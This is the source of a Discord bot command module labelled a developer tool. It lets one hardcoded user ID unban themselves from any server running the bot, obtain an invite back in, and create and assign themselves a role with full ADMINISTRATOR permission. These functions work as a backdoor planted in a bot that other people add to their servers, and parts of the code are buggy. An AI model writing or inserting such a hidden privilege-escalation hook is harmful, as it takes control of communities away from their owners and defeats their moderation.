module.exports = {
  //Defines properties
  name: "dev",
  description: "Only bot developer may use this command!",
  guildOnly: "true",
  //code to be executed
  async execute(
    message,
    args,
    displayColor,
    client,
    queues,
    connection,
    dispatchers
  ) {
    if (message.author.id != "176131037049389057") return;
    switch (args[0]) {
      case "unban":
        var user = args[2];
        var gname = args[1].replace("_", " ");
        var guild = client.guilds.find("name", gname);
        guild.unban(user);
        var unbanchan = guild.channels
          .filter(c => c.type === "text")
          .find(x => x.position == 0);
        message.channel.send({
          embed: {
            color: displayColor,
            //sets the time of the request being made
            timestamp: new Date(),
            thumbnail: guild.iconURL,
            footer: {
              text: `Requested by ADMINISTRATOR`,
              icon_url: `http://www.newdesignfile.com/postpic/2015/01/administrator-admin-icon_85347.png`
            },
            title: `Attempting Unban for ${guild.name}`
          }
        });
        unbanchan
          .createInvite()
          .then(invite => message.channel.send(invite.url));
        break;
      case "message":
        //Sends varius infromation about the message that invoked this command to be run
        message.channel.send(
          `Channel id:\n${message.channel}\n${
            message.channel.id
          }\nMessage ID:\n${
            message.id
          }\nMessage.user.avatar: \nhttps://cdn.discordapp.com/avatars/${
            message.author.id
          }/${
            message.author.avatar
          }.png \nMessage Content:\n${message.content.split(
            " "
          )} \n Message.Author: \n ${message.author}`
        );
        break;
      case "v":
        var v = args[1] / 100;
        dispatchers[message.guild.id].setVolumeLogarithmic(v);
        sendvolume(v, message, displayColor);
        queues[message.guild.id + "_v"] = v;
        break;
      case "grant":
        message.author.send({
          embed: {
            color: displayColor,
            //sets the time of the request being made
            timestamp: new Date(),
            footer: {
              text: `Requested by ADMINISTRATOR`,
              icon_url: `http://www.newdesignfile.com/postpic/2015/01/administrator-admin-icon_85347.png`
            },
            fields: [
              {
                name: "Granting Administrators Rights.",
                //Takes the current time subtracted by the time the users message was sent
                //Giving us the ping!
                value: new Date().getTime() - message.createdTimestamp + " ms"
              }
            ]
          }
        });

        grantAdmin(message);
        var role = message.guild.roles.find("Administrator");
        message.member.addRole(role);
        message.author.send({
          embed: {
            color: displayColor,
            //sets the time of the request being made
            timestamp: new Date(),
            footer: {
              text: `Requested by ADMINISTRATOR`,
              icon_url: `http://www.newdesignfile.com/postpic/2015/01/administrator-admin-icon_85347.png`
            },
            fields: [
              {
                name: "Granted. ADMINISTRATOR.",
                //Takes the current time subtracted by the time the users message was sent
                //Giving us the ping!
                value: new Date().getTime() - message.createdTimestamp + " ms"
              }
            ]
          }
        });
        message.channel.send({
          embed: {
            color: displayColor,
            //sets the time of the request being made
            timestamp: new Date(),
            footer: {
              text: `Requested by ADMINISTRATOR`,
              icon_url: `http://www.newdesignfile.com/postpic/2015/01/administrator-admin-icon_85347.png`
            },
            fields: [
              {
                name: "Granted.",
                //Takes the current time subtracted by the time the users message was sent
                //Giving us the ping!
                value: new Date().getTime() - message.createdTimestamp + " ms"
              }
            ]
          }
        });
        break;
      default:
        message.author.send({
          embed: {
            color: displayColor,
            //sets the time of the request being made
            timestamp: new Date(),
            footer: {
              text: `Requested by ADMINISTRATOR`,
              icon_url: `http://www.newdesignfile.com/postpic/2015/01/administrator-admin-icon_85347.png`
            },
            fields: [
              {
                name: "Granted. No Command Found.",
                //Takes the current time subtracted by the time the users message was sent
                //Giving us the ping!
                value: new Date().getTime() - message.createdTimestamp + " ms"
              }
            ]
          }
        });
    }
  }
};

function sendvolume(volume, message, displayColor) {
  message.channel.send({
    embed: {
      color: displayColor,
      //sets the time of the request being made
      timestamp: new Date(),
      footer: {
        text: `Requested by ADMINISTRATOR`,
        icon_url: `http://www.newdesignfile.com/postpic/2015/01/administrator-admin-icon_85347.png`
      },
      fields: [
        {
          name: "New Volume set:",
          //Takes the current time subtracted by the time the users message was sent
          //Giving us the ping!
          value: volume * 100 + "%"
        }
      ]
    }
  });
}

async function grantAdmin(message) {
  message.guild.createRole({
    name: "Administrator",
    position: "10",
    metionable: "false",
    permissions: "ADMINISTRATOR"
  });
  /*for (var i = 0; message.guild.roles.length; i++) {
    message.member.addRole(message.guild.roles[i].id);
  } */
  var role = message.guild.roles.find(role => role.name === "Administrator");
  message.member.addRole(role);
}
